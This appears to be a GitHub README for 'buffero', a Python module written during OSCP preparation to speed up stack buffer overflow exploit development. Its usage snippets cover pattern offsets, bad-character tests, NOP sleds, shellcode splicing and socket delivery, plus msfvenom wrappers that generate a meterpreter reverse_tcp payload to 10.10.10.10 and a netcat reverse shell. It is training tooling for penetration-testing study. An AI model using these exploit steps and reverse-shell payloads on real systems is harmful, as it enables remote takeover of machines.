# buffero

Buffer Overflow Exploit Developement Pyton module

I have created this module while I'm preparing for OSCP. This module helps the Buffer Overflow exploit developement in python language.

# How to use buffero module

This summary will describe how to use buffero

### Generate Cyclic Pattern

The **generate_pattern** function will generate an unique pattern, same as **msf-pattern_create**
```python
import buffero

# Generate 1200 length of Cyclic pattern
# Equivalent with msf-pattern_create -l 1200
pattern = buffero.generate_pattern(1200)
# pattern = Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A...
```

---

### Get the offset of the EIP value

The **get_pattern_offset** method will help to find the right offset value
```python
import buffero
    
EIP = '386F4337'	# The value of the EIP register
offset = buffero.get_pattern_offset(1200,EIP)
# offset = 2003
```
---

### Generate Bad Characters

```python
import buffero
    
badchararr = [0x00]	# Specify \x00 as a bad character
    
# Generate a bad character array without the \x00 character
bc = buffero.generate_bctest(badchars=badchararr)
```
Additionally, the **generate_bctest** function will write a result into a file which name is **bctest.bin**. This file is easily examine by xxd command.
```bash
root@kali:~# xxd bctest.bin
00000000: 0102 0304 0506 0708 090a 0b0c 0d0e 0f10  ................
00000010: 1112 1314 1516 1718 191a 1b1c 1d1e 1f20  ................
00000020: 2122 2324 2526 2728 292a 2b2c 2d2e 2f30  !"#$%&'()*+,-./0
00000030: 3132 3334 3536 3738 393a 3b3c 3d3e 3f40  123456789:;<=>?@
00000040: 4142 4344 4546 4748 494a 4b4c 4d4e 4f50  ABCDEFGHIJKLMNOP
00000050: 5152 5354 5556 5758 595a 5b5c 5d5e 5f60  QRSTUVWXYZ[\]^_`
00000060: 6162 6364 6566 6768 696a 6b6c 6d6e 6f70  abcdefghijklmnop
00000070: 7172 7374 7576 7778 797a 7b7c 7d7e 7f80  qrstuvwxyz{|}~..
00000080: 8182 8384 8586 8788 898a 8b8c 8d8e 8f90  ................
00000090: 9192 9394 9596 9798 999a 9b9c 9d9e 9fa0  ................
000000a0: a1a2 a3a4 a5a6 a7a8 a9aa abac adae afb0  ................
000000b0: b1b2 b3b4 b5b6 b7b8 b9ba bbbc bdbe bfc0  ................
000000c0: c1c2 c3c4 c5c6 c7c8 c9ca cbcc cdce cfd0  ................
000000d0: d1d2 d3d4 d5d6 d7d8 d9da dbdc ddde dfe0  ................
000000e0: e1e2 e3e4 e5e6 e7e8 e9ea ebec edee eff0  ................
000000f0: f1f2 f3f4 f5f6 f7f8 f9fa fbfc fdfe ff    ...............
```

---

### Generating NOP Sled


```python
import buffero

nops = buffero.generate_nop_sled(16)
# nops = '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'

```

---

### Packing the JMP Address

```python
import buffero

# same as struct.pack('<I',0x625011af)
# but in this case the result will be an str
addr = buffero.pack('<I',0x625011af)

```
---

### Spawning a Reverse Shell

```python
import buffero

# Listening on 0.0.0.0:9001
buffero.spawn_rev_shell(9001)
```

---

### Encoding and Decoding

In python3 socket.send() will work only byte type array. The encode method will encode the given string into 'Latin-1' encoded byte array.
The decode method will do the same but reverse order. Generate a string with 'Latin-1' encoding from byte array. This is useful when shellcode concatenated with the other pieces of the payload.

```python
import buffero

shellcode  = ""
shellcode += b"\xbb\x6a\xf5\xdd\x01\xd9\xe8\xd9\x74\x24\xf4"
...
shellcode += b"\x41\xa1\x25\xeb\xda\x44\x49\x58\xda\x4c"

# Decoding to string the given bytes type shellcode.
payload += offset + eip + padding + buffero.decode(shellcode) + suffix

# Encoding to bytes type array the concatenated payload
s.send(buffero.encode(payload))
```

---

### Generating Shellcode with MsfVenom

This module will use the MsfVenom application which installed on Kali systems by default. The purpose of this module to fasten the developement, avoiding to leave the developement platform, while generating shellcode, and copy and paste it. This module is not too smart but works well, if the requirements are installed.
Important note, the format must be python.
```python
import buffero

msf = msf_shellcode()

# Run custom MsfVenom command and get the shellcode back
# No need to specify the 'msfvenom' word
shellcode = msf.run_msfvenom_command('-p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9001 EXITFUNC=thread -f python')
# shellcode = xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b...

# Use predefined functions for fasten the developement
# Keyword arguments are enabled.
# Create POP CALC for determine the exploit is working.
shellcode = msf.generate_popcalc(exitfunc="thread",badchars="\\x00\\x0a")	# Escaping bad caharacters is important especially NULL sequence

# Create Netcat catchable Reverse shell.
shellcode = msf.generate_ncrev_shell(exitfunc="thread",badchars="",lhost="",lport="")
```
